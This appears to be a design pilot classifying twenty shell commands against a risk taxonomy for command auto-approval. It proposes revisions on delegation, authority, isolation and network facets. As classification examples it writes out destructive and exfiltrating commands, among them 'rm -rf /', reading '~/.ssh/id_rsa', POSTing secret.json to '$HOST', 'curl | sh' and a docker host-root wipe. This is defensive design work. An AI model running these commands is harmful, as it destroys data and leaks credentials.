# Behavioral Capability Model — Stage 2 pilot

Status: pilot output (2026-07-01). Feeds revisions back into `behavioral-taxonomy-v1.md`.

Goal: hand-classify 20 deliberately diverse command-forms against the v1 facets,
and record every place the taxonomy **strains** (⚠). The friction is the
deliverable — it tells us how to reshape the facets before we freeze anything.

Facets (v1): Operation · Locus · Reversibility · Disclosure · Network ·
Execution(provenance) · Persistence · Secret · Scale. Unlisted facets are at
their zero term.

## Classifications

**1. `echo hi`** — calibration.
`{observe · locus=process · disclosure=local-process}`. Clean.

**2. `cat ~/.ssh/id_rsa`**
`{observe · locus=user · disclosure=local-process · secret=reads}`.
⚠ `secret=reads` is a property of the *argument*, not of `cat`. `cat README` is
`secret=none`. Secret must be **resolved from the target path**, like locus.

**3. `echo x > .git/hooks/pre-commit`**
`{create · locus=worktree-trusted · persistence=installing}`. Clean — validates
locus split and the persistence axis.

**4. `rm -rf /`**
`{destroy · locus=machine · reversibility=irreversible · scale=unbounded}`.
⚠ Reversibility is environment-dependent: `rm` on a Mac with a trash-shim is
`recoverable`; a real `unlink` is `irreversible`. Need a **worst-case resolution
rule** for environment-dependent facets, with the assumption recorded.
⚠ As a normal user this mostly fails on permissions; as root it succeeds. The
outcome depends on **authority**, which v1 doesn't model.

**5. `find . -name '*.tmp' -delete`**
Base `find` = `{observe · locus=worktree · scale=bounded}`. The `-delete` action
**transforms** it to `{destroy · locus=worktree · reversibility=effortful ·
scale=unbounded}`. Validates modifier algebra.
⚠ `find … -exec rm {} \;` instead of `-delete` is **delegation**: find runs a
nested command per match. v1 has no way to express "runs command B, N times."

**6. `git config core.pager "sh -c evil"`**
`{configure · locus=user · persistence=reconfiguring}`. Clean, and correctly
flags the deferred-exec vector (the pager runs on the next paged git command).

**7. `curl https://api.internal/health`**
`{communicate · network=outbound-fixed · disclosure=trusted-remote}`.
⚠ "internal" vs "public" is not knowable from the URL alone; `disclosure` audience
is often indeterminate → worst-case.

**8. `curl -X POST -d @secret.json https://$HOST/collect`**
`{communicate · network=outbound-arbitrary · secret=transmits · disclosure=public}`.
⚠ Three distinct network sub-properties collide here: it's **outbound**, the
destination is **arbitrary** (`$HOST`), and it **sends host data** (a file body).
v1's single "network kind" enum can't carry all three at once.

**9. `python -m http.server 8000`**
`{communicate · network=inbound-listen · control}` and serves cwd:
`{observe · locus=worktree · disclosure=public}` (anyone who reaches the port
reads the tree). Validates `inbound-listen` and `disclosure=public` without any
outbound network. Two orthogonal network directions confirmed.

**10. `curl https://get.tool.sh | sh`**
`curl`: `{communicate · network=outbound-fixed}`. The pipe adds
`{execute · execution=network-sourced}`. Clean — but the provenance is on the
*pipeline*, not `curl` alone (already handled by the CST at the shell layer).

**11. `git push --force`**
`{mutate · locus=remote · network=outbound-fixed · disclosure=shared-remote ·
secret=uses-ambient · reversibility=irreversible}` (`--force` modifier sets
irreversible). Clean.

**12. `kubectl delete namespace prod`**
`{destroy · locus=remote · reversibility=irreversible · disclosure=shared-remote ·
scale=unbounded · network=outbound-fixed · secret=uses-ambient}`.
⚠ `scale=unbounded` (a namespace = many resources) is argument-derived, and the
blast radius (`prod`) is semantic, not syntactic. We can see "delete a namespace"
but not "this is production."

**13. `ssh user@host 'rm -rf /data'`**
`{execute · locus=remote · network=outbound-arbitrary}` wrapping a **nested
profile** = the classification of `rm -rf /data` projected onto the remote host.
⚠⚠ **Biggest gap.** `ssh host CMD` delegates arbitrary execution to another
machine. The nested command may be known (here) or opaque. v1 has no delegation
mechanism, and the remote nested command's own facets (destroy/irreversible)
should surface.

**14. `docker run -v /:/host alpine rm -rf /host`**
`{execute}` of a nested command in a **container frame**. Isolation would normally
*contain* the nested capabilities, but `-v /:/host` **mounts the host root**, so
locus escalates to `machine`/`irreversible`.
⚠⚠ Isolation is a real axis: a sandbox frame *downgrades* nested capability
locus; mount/privilege flags *breach* it. v1 has neither delegation nor
isolation.

**15. `sudo rm -rf /var`**
`sudo` is a **modifier** on the nested command: authority=root, which raises the
effective locus of `rm -rf /var` from "permission-denied" to
`machine · irreversible · unbounded`.
⚠ **Authority** (user / elevated / root / setuid) is unmodeled. It gates whether
`machine`-locus effects actually land.

**16. `cargo build`**
Irreducibly multi-capability:
`{execute · execution=network-sourced}` (runs `build.rs` and proc-macros from
downloaded crates — arbitrary code from the dependency tree) ·
`{communicate · network=outbound-fixed}` (fetches crates from the registry) ·
`{create · locus=worktree · persistence=data}` (writes `target/`).
⚠⚠ **The taxonomy is honest and it hurts.** `cargo build` runs untrusted
downloaded code, so under any strict level it is *not* auto-approvable — yet it's
an everyday command we classify SafeWrite today. This isn't a bug in the
taxonomy; it's the taxonomy revealing a truth the three-tier system hid. The
resolution is a **user level that accepts supply-chain execution** — which means
richer levels aren't a luxury, they're required for the model to be usable.

**17. `npm install`**
Same shape as cargo, worse: `{execute · execution=network-sourced}` (lifecycle
scripts: `postinstall`), `{communicate · outbound-fixed}`,
`{create/mutate · locus=worktree · persistence=data}`, and often
`{configure · persistence=reconfiguring}` (writes lockfiles, sometimes global
config). Reinforces #16.

**18. `terraform apply -auto-approve`**
`{create/mutate/destroy · locus=remote · cost=metered · persistence=installing ·
reversibility=effortful · secret=uses-ambient · network=outbound-arbitrary}`.
⚠ `cost=metered` earns its place (real money). ⚠ One command spans
create+mutate+destroy depending on the plan — the operation is **plan-dependent**
and unknowable statically → worst-case across operations.

**19. `psql -h db -c 'DROP TABLE users'`**
`{execute}` of SQL (a nested language) → `{destroy · locus=remote ·
reversibility=irreversible · scale=bounded · network=outbound-arbitrary ·
secret=uses-ambient}`.
⚠ Another **delegation to a nested language** (SQL). Same shape as ssh/docker:
the real behavior is in the payload, which is a different grammar.

**20. `git clean -n`**
`{observe · locus=worktree}` — the `-n`/`--dry-run` modifier collapses the
otherwise-`destroy` `git clean` to observe. Validates dry-run downgrade cleanly.
(Compare `git clean -fd` → `{destroy · locus=worktree · scale=bounded ·
reversibility=irreversible}`.)

## Friction findings → proposed revisions

Ranked by how much they reshape the model.

### R1 — Delegation is a first-class mechanism (from #5 -exec, #10, #13, #14, #19)
Many commands run a *nested command or language* whose behavior is the real
risk: `ssh host CMD`, `docker run … CMD`, `sudo CMD`, `bash -c CMD`, `xargs CMD`,
`find -exec CMD`, `timeout N CMD`, `env … CMD`, `watch CMD`, `psql -c SQL`,
`nix run … -- CMD`. Proposal: a capability may **wrap a nested profile**, which is
either resolved (the nested command is itself parsed and classified) or
`opaque` (unknown at check time → worst-case). The wrapper contributes its own
capabilities (network to reach the host) *plus* the nested profile transformed by
a **frame** (R2/R3). This is the single largest addition v1 missed.

### R2 — Authority facet (from #4, #15)
Add **Authority**: `user` → `elevated` (sudo/doas, a specific escalation) →
`root` → `setuid/other-user`. Authority gates whether `machine`/`user`-locus
effects land, and is the frame `sudo` applies to a nested profile. Without it,
`rm -rf /etc` and `sudo rm -rf /etc` look identical.

### R3 — Isolation facet/attribute (from #14, #16-17)
Add **Isolation** on delegation frames: `none` → `sandboxed` (container/VM/chroot,
which *downgrades* nested locus toward `process`) with explicit **breach flags**
(`-v` mounts, `--privileged`, `--network=host`, `--pid=host`) that re-escalate.
Package-manager plugin/script execution is the inverse: no isolation around
downloaded code.

### R4 — Split Network into three sub-facets (from #7, #8, #9, #18)
The single "network kind" enum can't carry a POST-secret-to-arbitrary-host. The
user's "six levels of network" are really the **product** of three small axes,
each independently describable:
- **Direction**: `none` · `loopback` · `outbound` · `inbound-listen`
- **Destination**: `n/a` · `fixed` (tool-set or literal) · `arbitrary` (argument-controllable)
- **Payload**: `none` · `fetches` (pulls data in) · `sends-host-data` (pushes local data out)
Every real network behavior is a describable point in Direction×Destination×Payload
(e.g. curl-GET-fixed = outbound/fixed/fetches; the POST above =
outbound/arbitrary/sends). This *is* the fine granularity, non-arbitrary.

### R5 — Argument-derived facets are a formal resolution step (from #2, #4, #7, #12, #18)
Locus, Secret, Disclosure-audience, Destination, and Scale are frequently
functions of argument values, not fixed on the command. Formalize a
**resolution pass**: classifier functions map argument shapes → facet values
(`classify_locus(path)`, `classify_secret(path)`, `classify_destination(url)`),
with the rule **indeterminate ⇒ worst-case in that facet** (a `$VAR`/glob target
takes the facet's max). This generalizes `is_safe_write_target` and
`PositionalShape` already in the tree, and answers open-question #4.

### R6 — Worst-case is the default resolution everywhere (from #4, #7, #18)
Reversibility (trash vs unlink), disclosure audience (internal vs public),
operation (terraform plan span) are all sometimes indeterminate. Rule: when a
facet can't be pinned, assume its worst term and record the assumption in
`because`. This keeps the model safe under uncertainty and honest about it.

### R7 — Realistic default levels are required, not optional (from #16, #17)
Honest classification makes `cargo build`/`npm install`/`go build` carry
`execution=network-sourced`, so they fail any strict predicate. The three legacy
tiers cannot be the only shipped levels. We need a small ladder that includes a
**`developer`** level: accepts `execution ∈ {…, network-sourced}` *from
recognized package/build tools*, `outbound-fixed` fetches, and `worktree` writes —
i.e. "I have accepted my project's supply chain." This makes level design part of
Stage 3, not an afterthought, and it's the first real proof of why user-tunable
levels matter.

## Net effect on the spec

- Facets grow from 9 to ~11: add **Authority** and **Isolation**; **split Network**
  into Direction/Destination/Payload (net +2 after removing the single Network
  facet).
- Add two mechanisms that aren't facets: **Delegation** (nested profiles) and the
  **argument-resolution pass** (with worst-case default).
- Elevate **level design** to a Stage-3 deliverable with a `developer` level, not
  just the legacy-tier bridge.
- Everything else in v1 held up: the set-of-capabilities model, locus split,
  persistence axis, execution-provenance axis, disclosure axis, the
  named-not-numbered / `because` / golden-set protocol.

Recommended: fold R1–R7 into `behavioral-taxonomy-v1.1`, then re-run this pilot's
20 forms against the revised facets to confirm each classifies without an
arbitrary judgment before freezing Stage 1.
